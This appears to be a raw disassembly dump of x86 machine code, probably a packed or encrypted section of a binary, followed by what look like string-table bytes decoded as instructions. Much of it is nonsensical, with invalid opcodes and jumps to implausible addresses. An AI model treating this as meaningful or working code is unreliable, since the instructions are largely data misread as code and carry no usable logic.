  426eb1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  426eb3:	mov    esi,0x591a6b68
  426eb8:	mov    ebx,0xa11722ce
  426ebd:	pop    edi
  426ebe:	and    ebp,edi
  426ec0:	sbb    BYTE PTR [eax+0x4f390515],0x8f
  426ec7:	jno    0x426eb8
  426ec9:	lods   al,BYTE PTR ds:[esi]
  426eca:	inc    eax
  426ecb:	pusha  
  426ecc:	in     al,dx
  426ecd:	mov    BYTE PTR [eax-0xcbc20ec],dh
  426ed3:	jae    0x426ec8
  426ed5:	dec    edi
  426ed6:	mov    BYTE PTR ds:0x5051933e,dh
  426edc:	test   eax,0xf89d39a4
  426ee1:	aad    0x44
  426ee3:	adc    al,0xbd
  426ee5:	ins    BYTE PTR es:[edi],dx
  426ee6:	(bad)  
  426ee8:	adc    al,BYTE PTR [ebp-0x34]
  426eeb:	sub    dl,dl
  426eed:	jecxz  0x426f04
  426eef:	add    eax,0x7e63cb1
  426ef4:	xchg   ecx,eax
  426ef5:	loopne 0x426efc
  426ef7:	xchg   ebp,eax
  426ef8:	and    ebx,DWORD PTR [ebx]
  426efa:	mov    eax,ds:0xcf550982
  426eff:	sbb    BYTE PTR [edx+edi*2-0xfc4b9a7],0xf0
  426f07:	ret    
  426f08:	xor    bl,BYTE PTR [edx+0x64fddfdb]
  426f0e:	cdq    
  426f0f:	jns    0x426ea7
  426f11:	cmp    al,0x63
  426f13:	mov    al,ds:0xafa80921
  426f18:	pop    ebx
  426f19:	pop    ecx
  426f1a:	push   ebp
  426f1b:	fist   DWORD PTR ds:0x887eca08
  426f21:	arpl   ax,si
  426f23:	(bad)  
  426f24:	out    0xd2,eax
  426f26:	call   0x196ba846
  426f2b:	mov    cl,0xb
  426f2d:	test   bh,dl
  426f2f:	cli    
  426f30:	or     dl,BYTE PTR [edi+0x5c578350]
  426f36:	cmp    bl,BYTE PTR [esi+0x41]
  426f39:	stos   BYTE PTR es:[edi],al
  426f3a:	jp     0x426ee3
  426f3c:	push   ebp
  426f3d:	sbb    cl,BYTE PTR [edi+ecx*8]
  426f40:	sub    dh,cl
  426f42:	jecxz  0x426ecc
  426f44:	mov    dl,0xb
  426f46:	loopne 0x426f5a
  426f48:	jmp    0xc467:0x4b849b16
  426f4f:	cmp    BYTE PTR [esi+eax*4+0x6c8df690],0x82
  426f57:	jl     0x426fbe
  426f59:	mov    dl,0x6
  426f5b:	or     eax,0xd76f4eae
  426f60:	lods   al,BYTE PTR ds:[esi]
  426f61:	daa    
  426f62:	les    ebp,FWORD PTR ds:0x9e32e78a
  426f68:	xchg   ecx,eax
  426f69:	enter  0xecfe,0xb9
  426f6d:	sub    ah,al
  426f6f:	push   cs
  426f70:	inc    ebx
  426f71:	jmp    0x426fbf
  426f73:	mov    cl,0x48
  426f75:	(bad)  
  426f76:	outs   dx,BYTE PTR ds:[esi]
  426f77:	cdq    
  426f78:	dec    esp
  426f79:	sbb    ebp,0xffffffd3
  426f7c:	pop    ds
  426f7d:	cmc    
  426f7e:	enter  0x7e6,0xd7
  426f82:	test   eax,0xc36f3869
  426f87:	arpl   WORD PTR ss:[ebx+ebp*1+0x44eb0e3],ax
  426f8f:	arpl   bp,cx
  426f91:	cli    
  426f92:	les    ebx,FWORD PTR [ecx]
  426f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f96:	bound  eax,QWORD PTR [edi+0x2a529b09]
  426f9c:	test   BYTE PTR [eax+0x65],bh
  426f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fa0:	fnstenv ds:0x6d74ccf2
  426fa6:	or     esi,ebp
  426fa8:	jecxz  0x426f37
  426faa:	jne    0x426f3a
  426fac:	jno    0x426f6a
  426fae:	pop    edx
  426faf:	sub    bh,al
  426fb1:	cs mov ecx,0xabf0e52b
  426fb7:	cdq    
  426fb8:	sub    BYTE PTR [eax-0x7a],0xd8
  426fbc:	shr    DWORD PTR [esp+edi*2+0x53],0x37
  426fc1:	cwde   
  426fc2:	and    dh,BYTE PTR ds:0x99fd1c67
  426fc8:	add    eax,0x4d06e517
  426fcd:	xor    DWORD PTR [esi+edi*8],0xffffffc1
  426fd1:	pop    ecx
  426fd2:	das    
  426fd3:	mov    edi,DWORD PTR [eiz*2-0x2e9329bc]
  426fda:	mov    ebp,0x18106b32
  426fdf:	pop    edx
  426fe0:	scas   eax,DWORD PTR es:[edi]
  426fe1:	pop    edx
  426fe2:	xchg   ecx,eax
  426fe3:	xchg   BYTE PTR [ecx],dh
  426fe5:	add    al,0x2b
  426fe7:	repnz stos DWORD PTR es:[edi],eax
  426fe9:	outs   dx,BYTE PTR ds:[esi]
  426fea:	add    DWORD PTR [ecx],ecx
  426fec:	out    dx,eax
  426fed:	add    esi,DWORD PTR [ebx+0x50]
  426ff0:	lahf   
  426ff1:	mov    cl,0x91
  426ff3:	mov    ebx,0xfddecf94
  426ff8:	arpl   WORD PTR ds:0xb20f44c6,cx
  426ffe:	xchg   DWORD PTR [ebx],ebp
  427000:	fs mov edi,0xe898d182
  427006:	in     al,dx
  427007:	call   DWORD PTR [esi-0x5e]
  42700a:	dec    edi
  42700b:	push   cs
  42700c:	and    al,0x80
  42700e:	je     0x426ff2
  427010:	mov    ds:0x31141be5,eax
  427015:	xchg   ecx,eax
  427016:	cmp    BYTE PTR [esi+0x1629b675],dl
  42701c:	pop    ecx
  42701d:	adc    al,0x3d
  42701f:	cld    
  427020:	xor    ch,BYTE PTR [edi+eax*8]
  427023:	iret   
  427024:	dec    edi
  427025:	loope  0x426fe2
  427027:	loop   0x42705a
  427029:	xchg   ebx,eax
  42702a:	loop   0x427008
  42702c:	sbb    dl,BYTE PTR [edi+esi*1]
  42702f:	xchg   ecx,eax
  427030:	xchg   ecx,eax
  427031:	fs inc ebp
  427033:	sbb    esi,esp
  427035:	mov    ebx,0x696086b
  42703a:	xchg   ebx,eax
  42703b:	pusha  
  42703c:	icebp  
  42703d:	jmp    0x5cc08b7b
  427042:	clc    
  427043:	(bad)  
  427044:	shr    DWORD PTR [ecx],1
  427046:	out    dx,eax
  427047:	pushf  
  427048:	xchg   bl,dh
  42704a:	loopne 0x4270af
  42704c:	sub    DWORD PTR [ebx],0xa68473b3
  427052:	mov    dl,0x80
  427054:	stos   BYTE PTR es:[edi],al
  427055:	hlt    
  427056:	aas    
  427057:	mov    eax,ds:0x7127201d
  42705c:	xchg   ecx,eax
  42705d:	loope  0x427038
  42705f:	jge    0x427030
  427061:	outs   dx,BYTE PTR ds:[esi]
  427062:	jbe    0x427000
  427064:	sti    
  427065:	mov    dh,0x2c
  427067:	mov    BYTE PTR [esi-0x6f59b9ad],0xa4
  42706e:	mov    ah,0xf
  427070:	lahf   
  427071:	xchg   DWORD PTR [edx+edi*8-0x46],esp
  427075:	pop    eax
  427076:	xchg   BYTE PTR [edx-0xf7c13],dh
  42707c:	dec    edi
  42707d:	add    dl,BYTE PTR [ecx-0x7a17de38]
  427083:	loope  0x427045
  427085:	ficom  DWORD PTR [ecx+0x67]
  427088:	inc    edx
  427089:	mov    BYTE PTR ds:0xbef6f832,dh
  42708f:	sub    dl,dh
  427091:	mov    ebx,0x42522ad0
  427096:	(bad)  
  427097:	xor    eax,0x36f49f45
  42709c:	add    DWORD PTR [ebx],edx
  42709e:	xor    eax,0x273f8a18
  4270a3:	pop    ebp
  4270a4:	xor    bl,BYTE PTR [ecx-0x43]
  4270a7:	test   al,0x2d
  4270a9:	jo     0x427108
  4270ab:	in     eax,0x61
  4270ad:	ret    0x54bb
  4270b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270b1:	les    ebp,FWORD PTR [esi-0x63]
  4270b4:	adc    eax,0x9038e8a3
  4270b9:	mov    edi,0xe53b77e
  4270be:	aad    0x43
  4270c0:	les    edx,FWORD PTR [edi+0x1a]
  4270c3:	les    edi,FWORD PTR [ebx+ebp*1]
  4270c6:	daa    
  4270c7:	inc    esp
  4270c8:	add    DWORD PTR [esi+ebx*1-0x52d8cb11],edx
  4270cf:	dec    eax
  4270d0:	jp     0x427111
  4270d2:	xchg   esp,eax
  4270d3:	xor    BYTE PTR [ebp-0x55],ah
  4270d6:	cmc    
  4270d7:	or     DWORD PTR [ebp-0x71],eax
  4270da:	push   eax
  4270db:	push   ss
  4270dc:	loopne 0x427078
  4270de:	push   ecx
  4270df:	push   cs
  4270e0:	add    dl,0x6c
  4270e3:	jbe    0x4270c0
  4270e5:	pusha  
  4270e6:	sahf   
  4270e7:	(bad)  
  4270e8:	jmp    0x427151
  4270ea:	das    
  4270eb:	(bad)  
  4270ec:	jge    0x427168
  4270ee:	push   es
  4270ef:	pop    edx
  4270f0:	pushf  
  4270f1:	pop    eax
  4270f2:	xor    dh,BYTE PTR [ebx+0x3f]
  4270f5:	add    BYTE PTR [edi],bh
  4270f7:	xor    dl,BYTE PTR [eax]
  4270f9:	xlat   BYTE PTR ds:[ebx]
  4270fa:	out    dx,eax
  4270fb:	ret    0x6f51
  4270fe:	cmp    BYTE PTR [ebp+0x79],dh
  427101:	sar    BYTE PTR [edi+ecx*8-0x28],cl
  427105:	mov    BYTE PTR [edi+ebp*4-0xea01300],0xb
  42710d:	dec    ebp
  42710e:	jle    0x42710f
  427110:	mov    ds:0xf00c0527,al
  427115:	mov    cl,0xff
  427118:	sub    bh,BYTE PTR [edi]
  42711a:	add    eax,0x89577d20
  42711f:	jecxz  0x42717c
  427121:	push   ss
  427122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427123:	inc    edi
  427124:	(bad)  
  427125:	repz jo 0x427114
  427128:	mov    ebp,0xb9963939
  42712d:	mov    cl,0x7c
  42712f:	lds    esp,FWORD PTR [ecx+0x52beb4d]
  427135:	data16 sbb al,0xf6
  427138:	pop    edx
  427139:	cmp    ebx,DWORD PTR [ebx+0x26cb76e0]
  42713f:	popf   
  427140:	lock mov es,esp
  427143:	xor    esi,DWORD PTR [esi+0x16]
  427146:	adc    eax,0x1374cbc5
  42714b:	xchg   ebx,eax
  42714c:	mov    al,ds:0x2ec0574e
  427151:	mov    edi,0x3d3cdff1
  427156:	xor    BYTE PTR [ebx],0x26
  427159:	inc    eax
  42715a:	in     eax,dx
  42715b:	sbb    BYTE PTR [ecx+0xe],bh
  42715e:	ror    DWORD PTR [edx+0x2b],0x3c
  427162:	inc    ebx
  427163:	into   
  427164:	shr    BYTE PTR [edi-0x27],1
  427167:	xor    dh,BYTE PTR [esi+0x5]
  42716a:	scas   al,BYTE PTR es:[edi]
  42716b:	xchg   edi,eax
  42716c:	fscale 
  42716e:	jmp    0xd3c:0x9c782b8e
  427175:	les    edi,FWORD PTR [esi]
  427177:	(bad)  
  427179:	xchg   ebp,eax
  42717a:	jae    0x427131
  42717c:	push   0xdbd4a1cc
  427181:	xor    al,0x55
  427183:	mov    WORD PTR [edi],gs
  427185:	jmp    0x2baf:0x42a38286
  42718c:	jne    0x4271fe
  42718e:	pop    esi
  42718f:	mov    esi,0xcf68931a
  427194:	jecxz  0x427182
  427196:	retf   0xc6fe
  427199:	addr16 in eax,0x44
  42719c:	iret   
  42719d:	fldz   
  42719f:	inc    esp
  4271a0:	cmp    al,0xd4
  4271a2:	push   0x4
  4271a4:	loopne 0x42721e
  4271a6:	neg    BYTE PTR [eax-0x50]
  4271a9:	inc    esi
  4271aa:	cmp    DWORD PTR [ebx+0x5],eax
  4271ad:	or     eax,0x9b806274
  4271b2:	xchg   ebx,eax
  4271b3:	pop    esp
  4271b4:	cdq    
  4271b5:	xchg   esi,eax
  4271b6:	(bad)  
  4271b7:	push   ebp
  4271b8:	mov    ecx,DWORD PTR [edx]
  4271ba:	fbstp  TBYTE PTR ds:0x861ec117
  4271c0:	sub    BYTE PTR [esi+ebp*1],dl
  4271c3:	sub    ch,BYTE PTR [esi+0x49059ed3]
  4271c9:	adc    esi,DWORD PTR [edi-0x6]
  4271cc:	test   al,0xd2
  4271ce:	cmp    eax,0x8f431757
  4271d3:	jno    0x42716b
  4271d5:	and    dh,ah
  4271d7:	(bad)  
  4271d9:	imul   esi,edi,0x8fcc022
  4271df:	cdq    
  4271e0:	aad    0xac
  4271e2:	call   0x2ded875e
  4271e7:	ds inc esi
  4271e9:	add    eax,0x9dbc8e59
  4271ee:	mov    eax,ds:0xa2b547b
  4271f3:	mov    eax,0x415eefc7
  4271f8:	jae    0x4271e1
  4271fa:	xchg   esi,eax
  4271fb:	mov    BYTE PTR [ebp+esi*8-0x57],bh
  4271ff:	push   0x5d
  427201:	fld    st(4)
  427203:	xchg   ebp,eax
  427204:	xchg   ebp,eax
  427205:	and    ebx,edi
  427207:	daa    
  427208:	sbb    esi,DWORD PTR [ecx-0x8]
  42720b:	or     ch,cl
  42720d:	dec    ecx
  42720e:	ret    0xbfed
  427211:	sub    DWORD PTR [edx-0x478579f4],esi
  427217:	and    al,0xf
  427219:	mov    ebp,ss
  42721b:	and    eax,0x1afb1db5
  427220:	enter  0x487b,0x42
  427224:	out    0x3,al
  427226:	add    al,0xcc
  427228:	nop
  427229:	adc    al,0x8d
  42722b:	mov    ebx,0xb982644e
  427230:	sbb    esi,DWORD PTR [esi+0x55]
  427233:	fild   DWORD PTR [edi+0x7db51bda]
  427239:	ss aad 0xb9
  42723c:	in     al,0x85
  42723e:	std    
  42723f:	pop    esi
  427240:	jl     0x427205
  427242:	add    eax,0xe86199f
  427247:	adc    bl,0x1b
  42724a:	mov    DWORD PTR [eax],esp
  42724c:	jnp    0x4272b0
  42724e:	sub    eax,ebp
  427250:	pop    ebp
  427251:	xchg   BYTE PTR [ebp-0x52],al
  427254:	push   edi
  427255:	arpl   WORD PTR [ecx+0xee7aa05],bp
  42725b:	xchg   edx,eax
  42725c:	xchg   ebp,eax
  42725d:	or     dl,ch
  42725f:	das    
  427260:	xchg   esi,eax
  427261:	mov    al,ds:0xe98f4011
  427266:	outs   dx,BYTE PTR ds:[esi]
  427267:	sti    
  427268:	retf   0x2841
  42726b:	dec    edx
  42726c:	and    cl,BYTE PTR [esp+eiz*2+0x72]
  427270:	lods   eax,DWORD PTR ds:[esi]
  427271:	sub    esi,DWORD PTR [esi-0x2]
  427274:	outs   dx,BYTE PTR ds:[esi]
  427275:	mov    edx,DWORD PTR [esi+0x7612b7d1]
  42727b:	mov    ch,0x3b
  42727d:	or     eax,0xdea1f5ed
  427282:	lahf   
  427283:	rcr    BYTE PTR [ebx+0x6a],0xc3
  427287:	sbb    BYTE PTR [edi+edi*1-0x55e5c180],bl
  42728e:	push   eax
  42728f:	xchg   esp,eax
  427290:	scas   eax,DWORD PTR es:[edi]
  427291:	fld    TBYTE PTR [esi+0x9]
  427294:	mov    eax,DWORD PTR fs:[eax]
  427297:	sub    bh,BYTE PTR [edx+0x7c]
  42729a:	stos   BYTE PTR es:[edi],al
  42729b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42729c:	inc    ecx
  42729d:	xor    al,0xc3
  42729f:	in     eax,0x2f
  4272a1:	jle    0x427264
  4272a3:	xor    eax,0x2a6ccf48
  4272a8:	pop    ebx
  4272a9:	mov    bh,BYTE PTR [ebx-0xf]
  4272ac:	xchg   edi,eax
  4272ad:	add    ah,bh
  4272af:	cmp    BYTE PTR [esi],dl
  4272b1:	rcl    cl,1
  4272b3:	mov    ebp,0xde70d26b
  4272b8:	(bad)  
  4272b9:	mov    esp,0x2cb587d9
  4272be:	dec    ebx
  4272bf:	mov    ds:0xd8e11cc3,al
  4272c4:	dec    ebx
  4272c5:	mov    ah,0xcf
  4272c7:	not    BYTE PTR [edi]
  4272c9:	inc    eax
  4272ca:	(bad)  
  4272cb:	push   ecx
  4272cc:	sub    esi,0x5a
  4272cf:	(bad)  
  4272d0:	mov    bl,0xa0
  4272d2:	xchg   edi,eax
  4272d3:	imul   ebp,DWORD PTR [edx*4-0x5c5c0986],0x6
  4272db:	out    dx,eax
  4272dc:	mov    esp,0x87a47f49
  4272e1:	sbb    eax,0xc367ad51
  4272e6:	in     al,dx
  4272e7:	pop    ecx
  4272e8:	aas    
  4272e9:	dec    ebp
  4272ea:	jg     0x4272bf
  4272ec:	sbb    eax,0x9eefb638
  4272f1:	lds    ebx,FWORD PTR [si-0x7f2c]
  4272f6:	cmp    BYTE PTR [edi],dh
  4272f8:	pop    ds
  4272f9:	mov    DWORD PTR [edx-0x24aad8a5],esp
  4272ff:	bound  edx,QWORD PTR [ebp-0x26e6f4d8]
  427305:	cmp    BYTE PTR [edi],0x64
  427308:	sub    edx,DWORD PTR [eax-0xcaead4f]
  42730e:	in     al,0xb
  427310:	xchg   esp,eax
  427311:	icebp  
  427312:	neg    bh
  427314:	outs   dx,DWORD PTR ds:[esi]
  427315:	dec    esi
  427316:	mov    ds:0xdce85d84,eax
  42731b:	or     ebx,edi
  42731d:	adc    BYTE PTR ds:0x417b5d19,al
  427323:	rep lods al,BYTE PTR ds:[esi]
  427325:	test   BYTE PTR [ebx],cl
  427327:	fdivr  DWORD PTR [edi+0x45]
  42732a:	test   BYTE PTR [esi+0x14],al
  42732d:	mov    DWORD PTR [esi+0x350d179e],esp
  427333:	call   0x60d48c60
  427338:	cmp    BYTE PTR [esi-0x14],dl
  42733b:	push   cs
  42733c:	cs fs jg 0x42739b
  427340:	mov    edx,0x2aaab43a
  427345:	test   esp,ebx
  427347:	xchg   esi,eax
  427348:	adc    DWORD PTR [edi-0x235dc6d4],eax
  42734e:	mov    ?,esi
  427350:	sti    
  427351:	push   ds
  427352:	add    BYTE PTR [edi+0x4f4f64ee],al
  427358:	cli    
  427359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42735a:	jg     0x427325
  42735c:	pop    edx
  42735d:	xchg   ecx,eax
  42735e:	call   0xb704d684
  427363:	lds    eax,FWORD PTR [ecx+0x4d4c7232]
  427369:	mov    ah,0x9a
  42736b:	sti    
  42736c:	js     0x42730e
  42736e:	mov    ch,al
  427370:	mov    BYTE PTR ds:0xd4425241,dl
  427376:	mov    ah,BYTE PTR [eax+0x4b]
  427379:	ins    DWORD PTR es:[edi],dx
  42737a:	or     BYTE PTR [ebx+eax*2-0x3e],ah
  42737e:	fdiv   DWORD PTR ds:0xc18ae491
  427384:	jne    0x4273ce
  427386:	stos   BYTE PTR es:[edi],al
  427387:	adc    DWORD PTR [eax+0x58],ebp
  42738a:	add    al,0x3c
  42738c:	jle    0x4273ad
  42738e:	cld    
  42738f:	retf   
  427390:	popa   
  427391:	pop    ebp
  427392:	or     eax,edx
  427394:	mov    DWORD PTR [eax-0x61ffbde],ebp
  42739a:	cdq    
  42739b:	xchg   edx,eax
  42739c:	jle    0x427394
  42739e:	icebp  
  42739f:	cs ret 0xa3fb
  4273a3:	pop    eax
  4273a4:	test   bl,ch
  4273a6:	addr16 pop eax
  4273a8:	cmp    eax,0x5f25bfa0
  4273ad:	push   cs
  4273ae:	sbb    DWORD PTR [eax],ebp
  4273b0:	(bad)  
  4273b1:	stos   BYTE PTR es:[edi],al
  4273b2:	enter  0xb837,0x7c
  4273b6:	cdq    
  4273b7:	or     al,0xc9
  4273b9:	hlt    
  4273ba:	fnsave [ebp+0x74fd093d]
  4273c0:	mov    ds:0x3425abf9,al
  4273c5:	adc    DWORD PTR [edi],eax
  4273c7:	mov    ecx,0x8f770bc7
  4273cc:	ins    DWORD PTR es:[edi],dx
  4273cd:	lods   eax,DWORD PTR ds:[esi]
  4273ce:	mov    ah,BYTE PTR [ebx+ebp*2+0xf]
  4273d2:	lock xchg esi,eax
  4273d4:	iret   
  4273d5:	test   DWORD PTR [edx],edx
  4273d7:	aam    0x69
  4273d9:	pop    esi
  4273da:	fsubr  DWORD PTR ds:0xb1167977
  4273e0:	sub    edi,ebp
  4273e2:	loope  0x42736c
  4273e4:	scas   al,BYTE PTR es:[edi]
  4273e5:	test   eax,0x7f21cb31
  4273ea:	inc    esp
  4273eb:	and    dl,BYTE PTR [edx]
  4273ed:	inc    ebx
  4273ee:	ins    BYTE PTR es:[edi],dx
  4273ef:	into   
  4273f0:	rcl    ecx,cl
  4273f2:	adc    esi,DWORD PTR [ecx-0x239bef55]
  4273f8:	dec    ebp
  4273f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273fa:	sub    DWORD PTR fs:[ebp-0x3],0x3b0545db
  427402:	push   edi
  427403:	lock sub edx,DWORD PTR ds:0x3f73247a
  42740a:	je     0x4273c7
  42740c:	retf   0x7768
  42740f:	in     al,dx
  427410:	dec    ecx
  427411:	pop    ebp
  427412:	push   edx
  427413:	scas   al,BYTE PTR es:[edi]
  427414:	dec    eax
  427415:	sahf   
  427416:	pushw  ds
  427418:	mov    al,0x6b
  42741a:	ret    0xb629
  42741d:	push   edx
  42741e:	icebp  
  42741f:	outs   dx,DWORD PTR ds:[esi]
  427420:	rcr    BYTE PTR [ecx+ecx*2],0x25
  427424:	xchg   ebp,eax
  427425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427426:	dec    ecx
  427427:	add    bl,BYTE PTR [ebp-0x24373658]
  42742d:	dec    ebx
  42742e:	(bad)  [edi]
  427430:	pop    edi
  427431:	push   esp
  427432:	fdivr  st(7),st
  427434:	sti    
  427435:	add    dl,BYTE PTR [edi]
  427437:	(bad)  
  427438:	sbb    DWORD PTR [ebx-0x4a],eax
  42743b:	ss cs hlt 
  42743e:	icebp  
  42743f:	fld    TBYTE PTR [edx+0x26]
  427442:	ds dec esp
  427444:	mov    BYTE PTR [ebx+eax*4-0x7a],cl
  427448:	adc    BYTE PTR fs:[edi-0x2eda3c26],0xe4
  427450:	or     al,0x69
  427452:	cmp    BYTE PTR [ecx],0x38
  427455:	(bad)  
  427456:	std    
  427457:	nop
  427458:	lea    ebp,[esp+eiz*4+0x30]
  42745c:	or     cl,bl
  42745e:	add    DWORD PTR [ebx-0x63],edi
  427461:	sbb    al,0xa7
  427463:	push   ecx
  427464:	ficom  DWORD PTR [eax-0x15]
  427467:	and    DWORD PTR [ebp-0x33],0xe199eda6
  42746e:	stc    
  42746f:	pop    ecx
  427470:	ja     0x4274cb
  427472:	adc    al,0xc4
  427474:	outs   dx,BYTE PTR ds:[esi]
  427475:	(bad)  
  427476:	cs shl cl,1
  427479:	iret   
  42747a:	push   es
  42747b:	push   ds
  42747c:	mov    ebp,DWORD PTR [ecx-0x41fcd3a6]
  427482:	adc    BYTE PTR [edi],ah
  427484:	call   0xcf9d:0x168a169b
  42748b:	lock push es
  42748d:	jp     0x427457
  42748f:	mov    esp,0x61d3a411
  427494:	ins    BYTE PTR es:[edi],dx
	...
  427511:	add    BYTE PTR [eax],al
  427513:	add    BYTE PTR [esi+0x2b],dh
  427516:	dec    eax
  427517:	jbe    0x427576
  427519:	ja     0x427599
  42751b:	sub    esi,DWORD PTR [ebp-0x4b]
  42751e:	(bad)  
  42751f:	retf   0xb01a
  427522:	mov    ecx,DWORD PTR [ecx+ebx*1+0x5]
  427526:	add    al,BYTE PTR [eax]
  427528:	adc    al,BYTE PTR [eax]
  42752a:	add    BYTE PTR [eax],al
  42752c:	scas   eax,DWORD PTR es:[edi]
  42752d:	or     ch,BYTE PTR [eax+0x46]
  427530:	jp     0x427564
  427532:	xor    ebx,DWORD PTR [eax-0x20cbbc86]
  427538:	or     dh,BYTE PTR [eax]
  42753a:	imul   ebx,DWORD PTR [edi],0xffffffeb
  42753d:	or     al,BYTE PTR [eax]
	...
  427593:	add    BYTE PTR [ebx],bh
  427595:	sub    al,0x10
  427597:	add    BYTE PTR [esi+0x5c001070],ch
  42759d:	and    edx,DWORD PTR [eax]
  42759f:	add    BYTE PTR [eax+0x1b],dh
  4275a2:	adc    BYTE PTR [eax],al
  4275a4:	dec    ebp
  4275a5:	adc    dl,BYTE PTR [eax]
  4275a7:	add    BYTE PTR [ebx],bl
  4275a9:	and    dl,BYTE PTR [eax]
  4275ab:	add    BYTE PTR [ecx+0x20],dh
  4275ae:	adc    BYTE PTR [eax],al
  4275b0:	cmp    edx,DWORD PTR gs:[eax]
  4275b3:	add    BYTE PTR [ebx+0x51],dl
  4275b6:	push   esi
  4275b7:	aaa    
  4275b8:	pop    edi
  4275b9:	dec    esp
  4275ba:	push   ebp
  4275bb:	ss push ebp
  4275bd:	pop    edi
  4275be:	xor    al,0x43
  4275c0:	aaa    
  4275c1:	dec    edi
  4275c2:	inc    ecx
  4275c3:	add    BYTE PTR [ebx+0x30],al
  4275c6:	xor    eax,0x47475f30
  4275cb:	push   ecx
  4275cc:	push   ebp
  4275cd:	push   ebx
  4275ce:	pop    edi
  4275cf:	xor    DWORD PTR [edx],esi
  4275d1:	inc    edi
  4275d2:	add    BYTE PTR [edi+0x45],al
  4275d5:	push   ebp
  4275d6:	pop    edi
  4275d7:	push   eax
  4275d8:	push   edx
  4275d9:	inc    ebp
  4275da:	pop    edx
  4275db:	xor    BYTE PTR [edi+0x34],bl
  4275de:	dec    edx
  4275df:	add    BYTE PTR [edx+0x4b],cl
  4275e2:	inc    edi
  4275e3:	ss pop edi
  4275e5:	push   edx
  4275e6:	dec    ecx
  4275e7:	dec    edi
  4275e8:	pop    edi
  4275e9:	push   ebp
  4275ea:	xor    dl,BYTE PTR [edi+0x0]
  4275ed:	push   edi
  4275ee:	cmp    BYTE PTR [ecx],dh
  4275f0:	pop    edi
  4275f1:	xor    eax,0x505357
  4275f6:	dec    ebx
  4275f7:	inc    esp
  4275f8:	aaa    
  4275f9:	pop    edi
  4275fa:	inc    esp
  4275fb:	cmp    BYTE PTR [eax+esi*1+0x34],dl
  4275ff:	pop    edi
  427600:	push   esi
  427601:	add    BYTE PTR [edx+ebx*2+0x42],dl
  427605:	pop    edi
  427606:	push   ebp
  427607:	push   edx
  427608:	inc    esi
  427609:	inc    ebx
  42760a:	dec    esi
  42760b:	xor    eax,DWORD PTR [eax]
  42760d:	inc    ebx
  42760e:	cmp    DWORD PTR [edx+0x5f],eax
  427611:	inc    esi
  427612:	pop    edx
  427613:	push   esi
  427614:	cmp    BYTE PTR [edi+0x4a],bl
  427617:	add    BYTE PTR [ecx+0x38],al
  42761a:	xor    ebx,DWORD PTR [edi+0x52]
  42761d:	push   ebx
  42761e:	pop    ecx
  42761f:	inc    esi
  427620:	xor    al,0x5f
  427622:	xor    eax,0x5a005157
  427627:	push   ebp
  427628:	xor    dh,BYTE PTR [esi]
  42762a:	xor    bl,BYTE PTR [edi+0x33]
  42762d:	inc    esp
  42762e:	push   esi
  42762f:	dec    esp
  427630:	push   ebx
  427631:	pop    edi
  427632:	xor    al,0x0
  427634:	push   ebx
  427635:	cmp    DWORD PTR [ebp+0x33],eax
  427638:	cmp    BYTE PTR [edi+0x59],bl
  42763b:	xor    DWORD PTR [edi+ebx*2+0x46],eax
  42763f:	dec    ebx
  427640:	cmp    DWORD PTR [edx+ebx*2+0x0],ecx
  427644:	inc    esi
  427645:	xor    al,0x48
  427647:	pop    edi
  427648:	xor    ecx,DWORD PTR [eax+0x37]
  42764b:	cmp    DWORD PTR [edi+0x37],ebx
  42764e:	dec    esi
  42764f:	xor    al,0x51
  427651:	add    BYTE PTR [ebx+0x56],dl
  427654:	push   esp
  427655:	pop    edi
  427656:	xor    al,0x37
  427658:	xor    eax,0x325f3353
  42765d:	add    BYTE PTR [eax+0x59],bl
  427660:	inc    esp
  427661:	pop    edi
  427662:	dec    ebx
  427663:	push   esp
  427664:	dec    esp
  427665:	inc    esp
  427666:	pop    edi
  427667:	cmp    DWORD PTR [eax],eax
  427669:	push   edi
  42766a:	dec    eax
  42766b:	push   edi
  42766c:	pop    edi
  42766d:	inc    ebp
  42766e:	dec    esp
  42766f:	inc    ecx
  427670:	xor    DWORD PTR [edi+0x47],ebx
  427673:	add    BYTE PTR [edx+eax*2+0x51],dl
  427677:	pop    edi
  427678:	xor    eax,0x5137385a
  42767d:	xor    eax,0x574d5400
  427682:	pop    edi
  427683:	xor    DWORD PTR [edx+ebx*2+0x53],edx
  427687:	pop    edi
  427688:	pop    eax
  427689:	xor    BYTE PTR [ecx+0x5f],cl
  42768c:	xor    eax,0x33420030
  427691:	xor    al,0x32
  427693:	xor    DWORD PTR [edi+0x58],ebx
  427696:	inc    ecx
  427697:	dec    esi
  427698:	pop    edi
  427699:	inc    edx
  42769a:	push   ebp
  42769b:	push   ecx
  42769c:	add    BYTE PTR [ebp+0x31],al
  42769f:	ss pop edi
  4276a1:	xor    BYTE PTR [eax+0x4c],cl
  4276a4:	pop    edi
  4276a5:	cmp    DWORD PTR [ebp+0x53],edx
  4276a8:	add    BYTE PTR [ebp+0x41],al
  4276ab:	dec    eax
  4276ac:	cmp    BYTE PTR [edi+0x35],bl
  4276af:	dec    esi
  4276b0:	push   ebx
  4276b1:	dec    ebx
  4276b2:	add    BYTE PTR [edi+0x38],dl
  4276b5:	xor    DWORD PTR [edi+0x48],ebx
  4276b8:	xor    DWORD PTR [ebp+0x4e],eax
  4276bb:	ss pop edi
  4276bd:	dec    eax
  4276be:	cmp    DWORD PTR [edx+0x0],eax
  4276c1:	push   esp
  4276c2:	aaa    
  4276c3:	xor    bh,BYTE PTR [ecx]
  4276c5:	xor    al,0x31
  4276c7:	pop    edi
  4276c8:	push   edx
  4276c9:	push   edi
  4276ca:	push   edx
  4276cb:	dec    ecx
  4276cc:	add    BYTE PTR [esi+0x4d],al
  4276cf:	push   edi
  4276d0:	pop    edi
  4276d1:	pop    ecx
  4276d2:	xor    eax,0x45395a
  4276d7:	pop    eax
  4276d8:	dec    eax
  4276d9:	aaa    
  4276da:	pop    edi
  4276db:	xor    dl,BYTE PTR [ebx+0x39]
  4276de:	xor    dh,BYTE PTR [esi]
  4276e0:	xor    eax,0x3936525f
